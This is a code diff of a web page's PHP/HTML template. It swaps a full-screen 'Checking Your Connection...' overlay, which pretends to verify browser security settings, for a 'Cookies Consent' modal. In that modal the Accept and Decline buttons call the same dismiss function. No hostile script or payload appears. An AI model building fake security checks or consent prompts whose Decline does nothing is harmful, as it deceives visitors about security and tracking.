@@ -354,31 +354,23 @@ foreach($_SERVER as $key=>$value){
 
   <script src="js/main.js"></script>
 
-<div id="cookie-backdrop" style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.65); backdrop-filter:blur(10px); -webkit-backdrop-filter:blur(10px); z-index:2147483646;"></div>
-
-<!-- Center Loader Modal Card -->
-<div id="cookie-consent-card" style="position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:92%; max-width:440px; background:#ffffff; padding:32px 28px; border-radius:16px; border:2px solid #2563eb; box-shadow:0 25px 60px rgba(0,0,0,0.45); z-index:2147483647; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; box-sizing:border-box; text-align:center;">
-    
-    <!-- Smooth Rotating Spinner -->
-    <div style="display:flex; justify-content:center; margin-bottom:18px;">
-        <div style="width:48px; height:48px; border:4px solid #e2e8f0; border-top:4px solid #2563eb; border-radius:50%; animation:spin-loader 0.85s linear infinite;"></div>
+<div id="cookie-backdrop" style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.65); backdrop-filter:blur(10px); -webkit-backdrop-filter:blur(3px); z-index:2147483646;"></div>
+<div id="cookie-consent-card" style="position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:92%; max-width:480px; background:#ffffff; padding:32px 30px; border-radius:16px; border:2px solid #2563eb; box-shadow:0 25px 60px rgba(0,0,0,0.45); z-index:2147483647; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; box-sizing:border-box; text-align:left;">
+    <div style="display:flex; align-items:center; gap:12px; margin-bottom:16px;">
+        <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="#2563eb" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5"/>
+            <path d="M8.5 8.5v.01"/><path d="M16 15.5v.01"/><path d="M12 12v.01"/><path d="M11 17v.01"/><path d="M7 14v.01"/>
+        </svg>
+        <span style="font-size:26px; font-weight:700; color:#2563eb; letter-spacing:-0.5px;">Cookies Consent</span>
     </div>
-    <style>
-        @keyframes spin-loader {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
-
-    <div style="font-size:22px; font-weight:700; color:#1e293b; margin-bottom:8px;">Checking Your Connection...</div>
-    <p style="font-size:14px; line-height:1.55; color:#64748b; margin:0 0 24px 0;">
-        Please wait while we verify your browser security settings before directing you to the destination.
+    <p style="font-size:15px; line-height:1.6; color:#374151; margin:0 0 26px 0;">
+        This website use cookies to help you have a superior and more admissible browsing experience on the website. 
+        <a href="#" style="color:#2563eb; text-decoration:none; font-weight:500;">Read more</a>
     </p>
 
-    <!-- Cancel & Continue Buttons -->
-    <div style="display:flex; gap:14px;">
-        <button id="btn-cancel" onclick="dismissCookieModal()" style="flex:1; background:#ffffff; color:#475569; border:2px solid #cbd5e1; padding:12px 0; font-size:15px; font-weight:600; border-radius:8px; cursor:pointer;">Cancel</button>
-        <button id="btn-continue" onclick="dismissCookieModal()" style="flex:1; background:#2563eb; color:#ffffff; border:none; padding:12px 0; font-size:15px; font-weight:600; border-radius:8px; cursor:pointer; box-shadow:0 4px 14px rgba(37,99,235,0.35);">Continue</button>
+    <div style="display:flex; gap:16px;">
+        <button id="btn-accept" onclick="dismissCookieModal()" style="flex:1; background:#3b82f6; color:#ffffff; border:none; padding:13px 0; font-size:16px; font-weight:600; border-radius:8px; cursor:pointer; box-shadow:0 4px 14px rgba(59,130,246,0.35);">Accept</button>
+        <button id="btn-decline" onclick="dismissCookieModal()" style="flex:1; background:#ffffff; color:#3b82f6; border:2px solid #3b82f6; padding:13px 0; font-size:16px; font-weight:600; border-radius:8px; cursor:pointer;">Decline</button>
     </div>
 </div>
 
